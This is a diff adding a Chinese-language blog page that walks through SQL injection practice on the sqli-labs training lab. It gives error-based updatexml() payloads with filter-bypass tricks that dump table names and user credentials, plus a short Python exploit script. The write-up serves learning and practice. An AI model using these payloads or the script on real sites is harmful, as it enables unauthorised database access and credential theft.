@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Time-Based Blind SQL Injection | DoubleLi's Blog</title><meta name="author" content="Double Li"><meta name="copyright" content="Double Li"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="使用提供的https:&#x2F;&#x2F;hub.docker.com&#x2F;r&#x2F;acgpiano&#x2F;sqli-labs &amp;#123;     docker pull acgpiano&#x2F;sqli-labs     docker run -dt --name sqli-lab -p 80:80 acgpiano&#x2F;sqli-labs:latest &amp;#125;  重置数据库后，找到报错注入和时间盲注 27题和第九关 报错注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Time-Based Blind SQL Injection">
+<meta property="og:url" content="http://example.com/post/ezsql.html">
+<meta property="og:site_name" content="DoubleLi&#39;s Blog">
+<meta property="og:description" content="使用提供的https:&#x2F;&#x2F;hub.docker.com&#x2F;r&#x2F;acgpiano&#x2F;sqli-labs &amp;#123;     docker pull acgpiano&#x2F;sqli-labs     docker run -dt --name sqli-lab -p 80:80 acgpiano&#x2F;sqli-labs:latest &amp;#125;  重置数据库后，找到报错注入和时间盲注 27题和第九关 报错注入">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64eca0a0661c6c8e54e60dec.jpg">
+<meta property="article:published_time" content="2023-08-29T00:02:30.000Z">
+<meta property="article:modified_time" content="2023-08-29T02:46:44.535Z">
+<meta property="article:author" content="Double Li">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/64eca0a0661c6c8e54e60dec.jpg"><link rel="shortcut icon" href="https://pic.imgdb.cn/item/6393106bb1fccdcd36e03717.gif"><link rel="canonical" href="http://example.com/post/ezsql"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Time-Based Blind SQL Injection',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-29 10:46:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imgdb.cn/item/6374f9aa16f2c2beb191be51.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.imgdb.cn/item/64eca0a0661c6c8e54e60dec.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">DoubleLi's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Time-Based Blind SQL Injection</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-29T00:02:30.000Z" title="Created 2023-08-29 08:02:30">2023-08-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-08-29T02:46:44.535Z" title="Updated 2023-08-29 10:46:44">2023-08-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Time-Based Blind SQL Injection"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>使用提供的<a target="_blank" rel="noopener" href="https://hub.docker.com/r/acgpiano/sqli-labs">https://hub.docker.com/r/acgpiano/sqli-labs</a></p>
+<pre><code>&#123;
+    docker pull acgpiano/sqli-labs
+    docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs:latest
+&#125;
+</code></pre>
+<p>重置数据库后，找到报错注入和时间盲注 27题和第九关</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><code>报错注入</code></h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a><code>手工注入</code></h2><p>之前有做过报错注入的题<br>默认sql语句比较熟悉的前提下<br><a target="_blank" rel="noopener" href="https://d0u6lel1.github.io/post/SQL.html">博客在这(sql合集里面的[极客大挑战 2019]HardSQL)</a>，再写一下一些知识</p>
+<pre><code>&#123;
+报错函数updatexml()函数，当第二个参数包含特殊符号时候就会报错，并且将第二个参数内容显示在报错信息中
+updatexml(1, 0x7e, 3)报错 0x7e 为 ~
+因此第二个参数将查询语句和特殊符号拼接就可以
+updatexml(1, concat(0x7e,version()), 3) 
+
+ps: updatexml报错内容不能超过32字符
+可用limit分页或者substr（）截取字符串
+concat(obj1，obj2，……)拼接字符串
+
+=号被过滤可以用like来绕过
+&#125;
+</code></pre>
+<p>知道了这些应该就容易了</p>
+<p>首先FUZZ字典看一下，会知道过滤了</p>
+<pre><code>select union UNION SELECT -- /*
+</code></pre>
+<p>注释符少了些，联合查询大小写或者双写可以绕过 应该就是替换为空</p>
+<p>先爆库名<br>1’or(updatexml(1,concat(1,database()),1))’<br>%20不行 换%09<br>payload:</p>
+<p>?id&#x3D;1%27or%09updatexml(1,concat(0x7e,(SeleCt(database())),0x7e),1)or%27   </p>
+<h3 id="库名-security"><a href="#库名-security" class="headerlink" title="库名 security"></a>库名 security</h3><img src='https://pic.imgdb.cn/item/64ed4582661c6c8e54fd2bad.png'>
+?id=1%27or%09updatexml(1,concat(0x7e,(sElEct(tAble_nAmE)fRoM(infOrmaTion_sChEmA.taBles)wheRe(tAble_sCheMa)='security'),0x7e),1)or%27
+显示有些长，无法显示出来 是由于之前说的xml最多显示32字符
+<img src='https://pic.imgdb.cn/item/64ed456f661c6c8e54fd2548.png'>
+简单直接groupconcat抓到一行里面
+?id=1%27or(updatexml(1,concat(0x7e,(sElEct(group_concat(tAble_nAmE))fRoM(infOrmaTion_sChEmA.taBles)wheRe(tAble_sCheMa)='security'),0x7e),1))or%27
+
+<img src='https://pic.imgdb.cn/item/64ed4555661c6c8e54fd20e2.png'>
+如果回显超过32字符， mysql有right和left，可以分段读取
+
+<h3 id="表名’emails-referers-uagents-users’"><a href="#表名’emails-referers-uagents-users’" class="headerlink" title="表名’emails,referers,uagents,users’"></a>表名’emails,referers,uagents,users’</h3><p>后面基本差不多了，想要什么库里面什么内容修改代码即可读取，不是ctf没有flag，就随便找一个地方看看，可以实现脚本脱库</p>
+<p>?id&#x3D;1%27or(updatexml(1,concat(0x7e,(sElEct(group_concat(columN_nAmE))fRoM(infOrmaTion_sChEmA.coLumNs)wheRe(tAble_name)&#x3D;’users’),0x7e),1))or%27</p>
+<img src='https://pic.imgdb.cn/item/64ed46e8661c6c8e54fd7348.png'>
+里面可以读取到referer来源 ip地址什么的
+
+<h3 id="columns-id-username-password"><a href="#columns-id-username-password" class="headerlink" title="columns: id,username,password"></a>columns: id,username,password</h3><p>随便看一个吧演示下注入语句，查其他库都差不多，记得大小写绕过一下</p>
+<p>?id&#x3D;1%27or(updatexml(1,concat(0x7e,(sElEct(group_concat(username,password))fRoM(security.users)),0x7e),1))or%27<br>成功<br><img src='https://pic.imgdb.cn/item/64ed4c0f661c6c8e54fe8781.png'></p>
+<h3 id="最后EXP-python"><a href="#最后EXP-python" class="headerlink" title="最后EXP(python):"></a>最后EXP(python):</h3><pre><code>&#123;
+import requests
+
+url = &#39;http://localhost/Less-27/?id=&#123;payload&#125;&#39;
+
+columns = &quot;username,password&quot;
+db = &quot;security&quot;
+tables = &quot;users&quot;
+
+payload = &quot;?id=1%27or(updatexml(1,concat(0x7e,(sElEct(group_concat(&#123;columns&#125;))fRoM(&#123;db&#125;.&#123;tables&#125;)),0x7e),1))or%27&quot;.format(columns=columns, db=db, tables=tables)
+#最终payload
+payload_tables=&quot;?id=1%27or(updatexml(1,concat(0x7e,(sElEct(group_concat(tAble_nAmE))fRoM(infOrmaTion_sChEmA.taBles)wheRe(tAble_sCheMa)=&#39;security&#39;),0x7e),1))or%27&quot;
+payload_columns=&quot;?id=1%27or(updatexml(1,concat(0x7e,(sElEct(group_concat(columN_nAmE))fRoM(infOrmaTion_sChEmA.coLumNs)wheRe(tAble_name)=&#39;&#123;table&#125;&#39;),0x7e),1))or%27&quot;.format(table=tables)
+#下面两个payload用来查其他表和列
+
+res = requests.get(url.format(payload=payload))
+start_marker = &#39;syntax error:&#39;
+end_marker = &#39;&lt;/font&gt;&lt;/font&gt;&#39;
+info = res.text.split(start_marker)[1].split(end_marker)[0]
+print(info)
+&#125;
+</code></pre>
+<p>ps:这里是个简单exp,没有完全实现自动化，需要手动更改下值，当然也可以改进脚本，读取库名表名自己填入，由于是靶场，不多写了,后面还有时间盲注脚本</p>
+<h2 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a><code>sqlmap一把梭</code></h2><p>get方式的请求，不用抓包，直接调用<br>ssh连接kali</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><code>时间盲注</code></h1><p>时间盲注之前本地测试过自己写的sql语句，利用回显时间延迟sleep()判断是否正确，页面没有什么直观回显<br>一些常用函数<br><code>sleep() left() ord() substr() left() mid() length() ascii() char()</code><br>根据sleep后返回的时间和ord()返回的ascii查看库名</p>
+<p>这里构造比较复杂，花时间太长，直接贴部分过程和EXP吧</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">Double Li</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/post/ezsql.html">http://example.com/post/ezsql.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=https://d0u6lel1.github.io/" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/Moe2023.html"><img class="next-cover" src="https://pic.imgdb.cn/item/64dc8cbf661c6c8e5403d925.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Moe2023 Reverse &amp; web</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/post/BUU-SOLVE.html" title="N1book web"><img class="cover" src="https://pic.imgdb.cn/item/64cc75bc1ddac507cce26390.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-03</div><div class="title">N1book web</div></div></a></div><div><a href="/post/CATCTF.html" title="CATcat_wp_web"><img class="cover" src="https://pic.imgdb.cn/item/64c5d1701ddac507ccede374.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-09</div><div class="title">CATcat_wp_web</div></div></a></div><div><a href="/post/Hgame.html" title="Hgame-WP"><img class="cover" src="https://pic.imgdb.cn/item/64cc75e41ddac507cce2bd25.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-11</div><div class="title">Hgame-WP</div></div></a></div><div><a href="/post/SQL.html" title="SQL"><img class="cover" src="https://pic.imgdb.cn/item/63d8faece90d1c0098ee7366.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div class="title">SQL</div></div></a></div><div><a href="/post/MoeCTF.html" title="Ezphp-wp"><img class="cover" src="https://pic.imgdb.cn/item/64cc78471ddac507cce88558.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-19</div><div class="title">Ezphp-wp</div></div></a></div><div><a href="/post/Moe2023.html" title="Moe2023 Reverse &amp; web"><img class="cover" src="https://pic.imgdb.cn/item/64dc8cbf661c6c8e5403d925.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-15</div><div class="title">Moe2023 Reverse &amp; web</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E5%90%8D-security"><span class="toc-number">1.1.1.</span> <span class="toc-text">库名 security</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D%E2%80%99emails-referers-uagents-users%E2%80%99"><span class="toc-number">1.1.2.</span> <span class="toc-text">表名’emails,referers,uagents,users’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#columns-id-username-password"><span class="toc-number">1.1.3.</span> <span class="toc-text">columns: id,username,password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8EEXP-python"><span class="toc-number">1.1.4.</span> <span class="toc-text">最后EXP(python):</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">1.2.</span> <span class="toc-text">sqlmap一把梭</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">时间盲注</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://pic.imgdb.cn/item/64eca0a0661c6c8e54e60dec.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Double Li</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
